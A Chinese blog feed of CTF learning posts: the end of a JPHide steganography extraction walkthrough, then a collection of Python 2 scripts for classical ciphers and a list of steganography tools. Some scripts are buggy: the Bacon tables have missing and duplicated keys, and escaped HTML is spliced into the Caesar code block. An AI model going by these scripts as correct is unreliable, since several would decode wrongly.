<p>8.第2步到第7步做的是Jhide方式信息隐藏，接下来我们从C4n-u-find-f14g.jpg图片提取出隐藏信息。</p>
<p><img src="http://i.imgur.com/H9QJnHU.jpg" alt=""></p>
<p>9.如果之前你并不知道图片是基于什么方式进行信息隐藏，你可以使用Stegdetect先进行探测。</p>
<p>Stegdetect的主要选项如下：</p>
<blockquote>
<p>-q  仅显示可能包含隐藏内容的图像。</p>
<p>-n  启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</p>
<p>-s  修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</p>
<p>-d  打印带行号的调试信息。</p>
<p>-t  设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</p>
<ul>
<li>j  检测图像中的信息是否是用jsteg嵌入的。</li>
<li>o  检测图像中的信息是否是用outguess嵌入的。</li>
<li>p  检测图像中的信息是否是用jphide嵌入的。</li>
<li>i  检测图像中的信息是否是用invisible secrets嵌入的。</li>
</ul>
<p>-V 显示软件版本号。</p>
<p>如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识</p>
<p>隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</p>
</blockquote>
<p>从下图可以看出很可能是Jphide的信息隐藏方式：</p>
<p><img src="http://i.imgur.com/i3zeRUx.png" alt=""></p>
<p>10.在知道隐藏方式之后可以开始进行信息提取，和使用JPHS进行信息隐藏过程类似，打开需要提取隐藏信息的图片C4n-u-find-f14g.jpg，输入对应密码（在不知道密码的情况不可以尝试Stegdetect工具里的Stegbreak程序进行基于字典的暴力攻击）flag，密码验证通过JPHS会自动提取隐藏信息，之后便可以另存提取出的信息。</p>
<p><img src="http://i.imgur.com/aCnBL4u.png" alt=""></p>
<p>11.打开提取得到的find.txt便可以得到我们想要的隐藏信息。</p>
<p><img src="http://i.imgur.com/1whWnla.png" alt=""></p>
<h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a href="http://mall.cnki.net/magazine/article/JSJC201006056.htm" target="_blank" rel="external">Jphide原理剖析及检测</a></p>
<p></p><p><a href="http://www.cnki.com.cn/Article/CJFDTotal-JSJC200707054.htm" target="_blank" rel="external">基于二次加密的JPhide隐写检测方法</a></p>
<ul>
<li>转载自<a href="https://www.hackfun.org/" target="_blank" rel="external">4ido10n’s Blog</a>文章<a href="https://www.hackfun.org/CTF/jphide-steganography.html" target="_blank" rel="external">《深入理解JPEG图像格式Jphide隐写》</a></li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CTF工具以及脚本的整理 ]]></title>
      <url>http://uknowsec.cn/posts/ctf/CTF%E5%B7%A5%E5%85%B7%E4%BB%A5%E5%8F%8A%E8%84%9A%E6%9C%AC%E7%9A%84%E6%95%B4%E7%90%86.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="密码学-cryptology"><a href="#密码学-cryptology" class="headerlink" title="密码学 cryptology"></a><a href="#密码学-cryptology"></a>密码学 <code>cryptology</code></h1><p><a href="http://www.practicalcryptography.com/" target="_blank" rel="external">各种密码学的在线解密</a></p>
<h2 id="简单的位移密码"><a href="#简单的位移密码" class="headerlink" title="简单的位移密码"></a><a href="#简单的位移密码"></a>简单的位移密码</h2><p><code>默认位移13 即rot13</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-<em>- coding:utf-8 -</em>-</span></div><div class="line">str =raw_input(<span class="string">‘put flag:’</span>)</div><div class="line">new_str = <span class="string">“”</span></div><div class="line">yi = <span class="number">13</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</div><div class="line">    <span class="keyword">if</span> i&gt;=<span class="string">‘a’</span> <span class="keyword">and</span> i&lt;=<span class="string">‘z’</span>:</div><div class="line">        i = ord(i)</div><div class="line">        i = ((i-yi)<span class="number">-97</span>)%<span class="number">26</span>+<span class="number">97</span></div><div class="line">        i = chr(i)</div><div class="line">        new_str = new_str+i</div><div class="line">        print(new_str)</div></pre></td></tr></tbody></table></figure>

<h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a><a href="#培根密码"></a>培根密码</h2><p>培根是根据字体的斜体 大小写转化成AB等字符 然后每五个对应一个字母的脚本  我还没写大小写转化脚本 这里只有 五个字母对应一个字母脚本<br>（1）<a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="external">在线加解密</a><br>（2）<code>Python脚本</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/Bin/env python</span></div><div class="line"><span class="comment"># -<em>- coding: utf-8 -</em>-</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -<em>- coding: utf-8 -</em>-</span></div><div class="line"><span class="comment">#<strong>author</strong> = ‘tyomcat’</span></div><div class="line"><span class="comment"># 培根解密代码</span></div><div class="line"><span class="comment"># 两种加密方式</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig1</span><span class="params">(m)</span>:</span></div><div class="line">    basic1 = {</div><div class="line">    <span class="string">‘AAAAA’</span> : <span class="string">‘A’</span>,</div><div class="line">    <span class="string">‘AAAAB’</span> : <span class="string">‘B’</span>,</div><div class="line">    <span class="string">‘AAABA’</span> : <span class="string">‘C’</span>,</div><div class="line">    <span class="string">‘AAABB’</span> : <span class="string">‘D’</span>,</div><div class="line">    <span class="string">‘AABAA’</span> : <span class="string">‘E’</span>,</div><div class="line">    <span class="string">‘AABAB’</span> : <span class="string">‘F’</span>,</div><div class="line">    <span class="string">‘AABBA’</span> : <span class="string">‘G’</span>,</div><div class="line">    <span class="string">‘AABBB’</span> : <span class="string">‘H’</span>,</div><div class="line">    <span class="string">‘ABAAA’</span> : <span class="string">‘I’</span>,</div><div class="line">    <span class="string">‘ABAAB’</span> : <span class="string">‘J’</span>,</div><div class="line">    <span class="string">‘ABABA’</span> : <span class="string">‘K’</span>,</div><div class="line">    <span class="string">‘ABABB’</span> : <span class="string">‘L’</span>,</div><div class="line">    <span class="string">‘ABBAB’</span> : <span class="string">‘N’</span>,</div><div class="line">    <span class="string">‘ABBBA’</span> : <span class="string">‘O’</span>,</div><div class="line">    <span class="string">‘ABBBB’</span> : <span class="string">‘P’</span>,</div><div class="line">    <span class="string">‘BAAAA’</span> : <span class="string">‘Q’</span>,</div><div class="line">    <span class="string">‘BAAAB’</span> : <span class="string">‘R’</span>,</div><div class="line">    <span class="string">‘BAABA’</span> : <span class="string">‘S’</span>,</div><div class="line">    <span class="string">‘BAABB’</span> : <span class="string">‘T’</span>,</div><div class="line">    <span class="string">‘BABAA’</span> : <span class="string">‘U’</span>,</div><div class="line">    <span class="string">‘BABAB’</span> : <span class="string">‘V’</span>,</div><div class="line">    <span class="string">‘BABBA’</span> : <span class="string">‘W’</span>,</div><div class="line">    <span class="string">‘BABBB’</span> : <span class="string">‘X’</span>,</div><div class="line">    <span class="string">‘BBAAA’</span> : <span class="string">‘Y’</span>,</div><div class="line">    <span class="string">‘BBAAB’</span> : <span class="string">‘Z’</span></div><div class="line">    }</div><div class="line">    output = <span class="string">‘’</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</div><div class="line">        temp = m[i: i + <span class="number">5</span>]</div><div class="line">        output += basic1[temp]</div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig2</span><span class="params">(m)</span>:</span></div><div class="line"></div><div class="line">    basic2 = {</div><div class="line">    <span class="string">‘AAAAA’</span> : <span class="string">‘A’</span>,</div><div class="line">    <span class="string">‘AAAAB’</span> : <span class="string">‘B’</span>,</div><div class="line">    <span class="string">‘AAABA’</span> : <span class="string">‘C’</span>,</div><div class="line">    <span class="string">‘AAABB’</span> : <span class="string">‘D’</span>,</div><div class="line">    <span class="string">‘AABAA’</span> : <span class="string">‘E’</span>,</div><div class="line">    <span class="string">‘AABAB’</span> : <span class="string">‘F’</span>,</div><div class="line">    <span class="string">‘AABBA’</span> : <span class="string">‘G’</span>,</div><div class="line">    <span class="string">‘AABBB’</span> : <span class="string">‘H’</span>,</div><div class="line">    <span class="string">‘ABAAA’</span> : <span class="string">‘I’</span>,</div><div class="line">    <span class="string">‘ABAAA’</span> : <span class="string">‘J’</span>,</div><div class="line">    <span class="string">‘ABAAB’</span> : <span class="string">‘K’</span>,</div><div class="line">    <span class="string">‘ABABA’</span> : <span class="string">‘L’</span>,</div><div class="line">    <span class="string">‘ABABB’</span> : <span class="string">‘M’</span>,</div><div class="line">    <span class="string">‘ABBAA’</span> : <span class="string">‘N’</span>,</div><div class="line">    <span class="string">‘ABBAB’</span> : <span class="string">‘O’</span>,</div><div class="line">    <span class="string">‘ABBBA’</span> : <span class="string">‘P’</span>,</div><div class="line">    <span class="string">‘ABBBB’</span> : <span class="string">‘Q’</span>,</div><div class="line">    <span class="string">‘BAAAA’</span> : <span class="string">‘R’</span>,</div><div class="line">    <span class="string">‘BAAAB’</span> : <span class="string">‘S’</span>,</div><div class="line">    <span class="string">‘BAABA’</span> : <span class="string">‘T’</span>,</div><div class="line">    <span class="string">‘BAABB’</span> : <span class="string">‘U’</span>,</div><div class="line">    <span class="string">‘BAABB’</span> : <span class="string">‘V’</span>,</div><div class="line">    <span class="string">‘BABAA’</span> : <span class="string">‘W’</span>,</div><div class="line">    <span class="string">‘BABAB’</span> : <span class="string">‘X’</span>,</div><div class="line">    <span class="string">‘BABBA’</span> : <span class="string">‘Y’</span>,</div><div class="line">    <span class="string">‘BABBB’</span> : <span class="string">‘Z’</span></div><div class="line">    }</div><div class="line">    output = <span class="string">‘’</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</div><div class="line">        temp = m[i: i + <span class="number">5</span>]</div><div class="line">        output += basic2[temp]</div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"><span class="keyword">if</span> <strong>name</strong> == <span class="string">‘<strong>main</strong>‘</span>:</div><div class="line">    </div><div class="line">    m = raw_input(<span class="string">“请输入密文:”</span>)</div><div class="line">    mode = input(<span class="string">“选择密文对应的方式 1 or 2：”</span>)</div><div class="line">    <span class="keyword">if</span> len(m)%<span class="number">5</span> == <span class="number">0</span>:</div><div class="line">        l = []</div><div class="line">        k = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(m)/<span class="number">5</span>):</div><div class="line">            l.append(m[:<span class="number">5</span>])</div><div class="line">            m = m[<span class="number">5</span>:]</div><div class="line">        <span class="keyword">if</span> mode == <span class="number">1</span>:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</div><div class="line">                <span class="keyword">if</span> i.isupper():</div><div class="line">                    k.append(peig1(i))</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    i = i.upper()</div><div class="line">                    k.append(peig1(i))</div><div class="line"></div><div class="line">        <span class="keyword">elif</span> mode == <span class="number">2</span>:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</div><div class="line">                <span class="keyword">if</span> i.isupper():</div><div class="line">                    k.append(peig2(i))</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    i = i.upper()</div><div class="line">                    k.append(peig2(i))</div><div class="line">        flag = <span class="string">‘’</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> k:</div><div class="line">            flag+=i[<span class="number">0</span>]</div><div class="line">        <span class="keyword">print</span> flag</div></pre></td></tr></tbody></table></figure>

<h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a><a href="#栅栏密码"></a>栅栏密码</h2><p>(1) 一个win平台下的<a href="http://oayoilchh.bkt.clouddn.com/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%861.10.exe" target="_blank" rel="external">软件</a><br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/14:49:39%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/14:49:39%20" alt=""></a><br>（2）<code>python脚本</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#author:Swing</span></div><div class="line"><span class="comment">#通用脚本</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -<em>- coding: utf_8 -</em>-</span></div><div class="line">e = raw_input(<span class="string">‘请输入要解密的字符串\n’</span>)</div><div class="line">elen = len(e)</div><div class="line">field=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,elen):</div><div class="line">            <span class="keyword">if</span>(elen%i==<span class="number">0</span>):</div><div class="line">                field.append(i)</div><div class="line"><span class="keyword">for</span> f <span class="keyword">in</span> field:</div><div class="line">    b = elen / f</div><div class="line">    result = {x:<span class="string">‘’</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(b)}</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(elen):</div><div class="line">        a = i % b;</div><div class="line">        result.update({a:result[a] + e[i]})</div><div class="line">    d = <span class="string">‘’</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b):</div><div class="line">        d = d + result[i]</div><div class="line">    <span class="keyword">print</span> <span class="string">‘分为\t’</span>+str(f)+<span class="string">‘\t’</span>+<span class="string">‘栏时，解密结果为：  ‘</span>+d</div></pre></td></tr></tbody></table></figure>

<h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a><a href="#凯撒密码"></a>凯撒密码</h2><p>凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推，更多<a href="https://en.wikipedia.org/wiki/Caesar_cipher" target="_blank" rel="external">参考</a><br>位移参考<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:00:45%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:00:45%20" alt=""></a><br>(1)<a href="http://planetcalc.com/1434/" target="_blank" rel="external">网站链接</a> 这个网站可以列出1-26的可能性<br>(1)还有一种方法就是利用<a href="http://" target="_blank" rel="external">JPK</a>这个工具<br>使用方法看图就够了吧 <a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:32:31%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:32:31%20" alt=""></a><br>(3)<code>Python实现</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="comment">#<strong>author</strong> = ‘tyomcat’</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(c, key, start = <span class="string">‘a’</span>, n = <span class="number">26</span>)</span>:</span></div><div class="line">    a = ord(start)</div><div class="line">    offset = ((ord(c) - a + key)%n)</div><div class="line">    <span class="keyword">return</span> chr(a + offset)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesarEncode</span><span class="params">(s, key)</span>:</span></div><div class="line">    o = <span class="string">“”</span></div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</div><div class="line">        <span class="keyword">if</span> c.islower():</div><div class="line">            o+= convert(c, key, <span class="string">‘a’</span>)</div><div class="line">        <span class="keyword">elif</span> c.isupper():</div><div class="line">            o+= convert(c, key, <span class="string">‘A’</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            o+= c</div><div class="line">    <span class="keyword">return</span> o</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesarDecode</span><span class="params">(s, key)</span>:</span></div><div class="line">    <span class="keyword">return</span> caesarEncode(s, -key)</div><div class="line"><span class="keyword">if</span> <strong>name</strong> == <span class="string">‘<strong>main</strong>‘</span>:</div><div class="line"></div><div class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">27</span>):</div><div class="line">       e=<span class="string">‘Jr1p0zr2VfPp’</span>     <span class="comment">#写这里</span></div><div class="line">       d = caesarDecode(e, key)</div><div class="line"></div><div class="line">       <span class="keyword">print</span> d</div><div class="line">       <span class="keyword">print</span> <span class="string">‘\n’</span></div><div class="line"><code>python&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;## 简单替换密码&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;简单换位密码(Simple Substitution Cipher)加密方式是以每个明文字母被与之唯一对应且不同的字母替换的方式实现的，它不同于恺撒密码，因为密码字母表的字母不是简单的移位，而是完全是混乱的 例如：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;</code>code</div><div class="line">明文字母 : abcdefghijklmnopqrstuvwxyz</div><div class="line">明文字母 : phqgiumeaylnofdxjkrcvstzwb</div></pre></td></tr></tbody></table></figure>

<p>其实我感觉有点像是词频攻击就可以解决所以我（麦香师傅告诉我才知道的）推荐一个词频攻击的网站<code>要有梯子</code><a href="http://quipqiup.com/index.php" target="_blank" rel="external">http://quipqiup.com/index.php</a></p>
<h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a><a href="#猪圈密码"></a>猪圈密码</h2><p>猪圈密码(Pigpen Cipher或称九宫格密码、朱高密码、共济会密码或共济会员密码)，是一种以格子为基础的简单替代式密码<br>明文和密文对应：<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:51:15%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:51:15%20" alt=""></a><br>在线解密<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="external">飞机票</a><br>上面是正常的对应 我见过一种变形的 与其说是猪圈不如说是替换<br>替换规则是 左右字母替换<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:56:11%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:56:11%20" alt=""></a><br>右边的跟左边的一一对应，在左边的换成右边<br><code>2015年广东强网杯 小心猪圈</code>的题目就是这样的<br>附上我的脚本</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line">s=raw_input()</div><div class="line">Key = {</div><div class="line">    <span class="string">‘a’</span>:<span class="string">‘j’</span>,</div><div class="line">    <span class="string">‘b’</span>:<span class="string">‘k’</span>,</div><div class="line">    <span class="string">‘c’</span>:<span class="string">‘l’</span>,</div><div class="line">    <span class="string">‘d’</span>:<span class="string">‘m’</span>,</div><div class="line">    <span class="string">‘e’</span>:<span class="string">‘n’</span>,</div><div class="line">    <span class="string">‘f’</span>:<span class="string">‘o’</span>,</div><div class="line">    <span class="string">‘g’</span>:<span class="string">‘p’</span>,</div><div class="line">    <span class="string">‘h’</span>:<span class="string">‘q’</span>,</div><div class="line">    <span class="string">‘i’</span>:<span class="string">‘r’</span>,</div><div class="line">    <span class="string">‘s’</span>:<span class="string">‘w’</span>,</div><div class="line">    <span class="string">‘t’</span>:<span class="string">‘x’</span>,</div><div class="line">    <span class="string">‘u’</span>:<span class="string">‘y’</span>,</div><div class="line">    <span class="string">‘v’</span>:<span class="string">‘z’</span>,</div><div class="line">    <span class="string">‘-‘</span>:<span class="string">‘-‘</span>,</div><div class="line">    <span class="string">‘{‘</span>:<span class="string">‘{‘</span>,</div><div class="line">    <span class="string">‘}’</span>:<span class="string">‘}’</span>,</div><div class="line">    <span class="string">‘j’</span>:<span class="string">‘a’</span>,</div><div class="line">    <span class="string">‘k’</span>:<span class="string">‘b’</span>,</div><div class="line">    <span class="string">‘l’</span>:<span class="string">‘c’</span>,</div><div class="line">    <span class="string">‘m’</span>:<span class="string">‘d’</span>,</div><div class="line">    <span class="string">‘n’</span>:<span class="string">‘e’</span>,</div><div class="line">    <span class="string">‘o’</span>:<span class="string">‘f’</span>,</div><div class="line">    <span class="string">‘p’</span>:<span class="string">‘g’</span>,</div><div class="line">    <span class="string">‘q’</span>:<span class="string">‘h’</span>,</div><div class="line">    <span class="string">‘r’</span>:<span class="string">‘i’</span>,</div><div class="line">    <span class="string">‘w’</span>:<span class="string">‘s’</span>,</div><div class="line">    <span class="string">‘x’</span>:<span class="string">‘t’</span>,</div><div class="line">    <span class="string">‘y’</span>:<span class="string">‘u’</span>,</div><div class="line">    <span class="string">‘z’</span>:<span class="string">‘v’</span></div><div class="line">}</div><div class="line">output1 = <span class="string">‘’</span></div><div class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">0</span>,len(s)):</div><div class="line">     temp=s[i]</div><div class="line">     output1+=Key[temp]</div><div class="line"><span class="keyword">print</span> output1</div></pre></td></tr></tbody></table></figure>

<p>更多关于密码学和编码的问题可以参考<a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="external">4ido10n表哥的博文</a></p>
<h1 id="隐写工具"><a href="#隐写工具" class="headerlink" title="隐写工具"></a><a href="#隐写工具"></a>隐写工具</h1><h2 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a><a href="#Stegsolve"></a>Stegsolve</h2><p>图片隐写的神器 <a href="https://yunpan.cn/c6jV9E9ZevwdF" target="_blank" rel="external">下载的传送门</a>（提取码：c146）<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:20:30%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:20:30%20" alt=""></a><br>具体可以自己尝试 简单介绍几下两个功能</p>
<ol>
<li>Stereogram Solver<br>这个功能可以从不同通道去分析图片</li>
<li>Frame Browser<br>这个功能是如果这张图片里面还藏这另外一张图片的话 他可以分离出来</li>
<li><p>Image Combiner<br>这个功能可以对比两张图片 最终Sub出不一样的地方</p>
<h2 id="pngcheck"><a href="#pngcheck" class="headerlink" title="pngcheck"></a><a href="#pngcheck"></a>pngcheck</h2><p><code>pngcheck.exe -v sctf.png</code><br><code>这个是Dos下的工具 win32平台的</code><br><a href="https://yunpan.cn/c6jjU9MsIWkWv" target="_blank" rel="external">下载传送门</a> （提取码：f47b）<br>他的功能是检测png格式图片的损坏位置 一般用来对PNG隐写进行修复会用到</p>
<h2 id="stegdetect"><a href="#stegdetect" class="headerlink" title="stegdetect"></a><a href="#stegdetect"></a>stegdetect</h2><p>这个东西是用来检测图片的隐写方式的 它可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息<br><a href="https://yunpan.cn/c6jwUT7EA9ywW" target="_blank" rel="external">下载传送门</a> （提取码：4c2e）<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:35:39%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:35:39%20" alt=""></a><br>比如图中就可以看出他是<code>Jphide</code>隐写<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">使用规则:</div><div class="line">    q 仅显示可能包含隐藏内容的图像。</div><div class="line">-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</div><div class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</div><div class="line">-d 打印带行号的调试信息。</div><div class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</div><div class="line">j 检测图像中的信息是否是用jsteg嵌入的。</div><div class="line">o 检测图像中的信息是否是用outguess嵌入的。</div><div class="line">p 检测图像中的信息是否是用jphide嵌入的。</div><div class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。</div><div class="line">-V 显示软件版本号。</div><div class="line">如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识</div><div class="line">隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</div></pre></td></tr></tbody></table></figure></p>
</li>
</ol>
<h2 id="Jphide"><a href="#Jphide" class="headerlink" title="Jphide"></a><a href="#Jphide"></a>Jphide</h2><p>先推荐表哥的博文 他写得好详细<a href="https://www.hackfun.org/CTF/jphide-steganography.html" target="_blank" rel="external">传送门</a><br><a href="http://linux01.gwdg.de/~alatham/stego.html" target="_blank" rel="external">下载传送门</a><br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:45:16%20" target="_blank" rel="external"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:45:16%20" alt=""></a><br><code>左边是隐写 右边是提取隐写文件</code></p>
<h2 id="Winhex"><a href="#Winhex" class="headerlink" title="Winhex"></a><a href="#Winhex"></a>Winhex</h2><p>二进制文件打开方式</p>
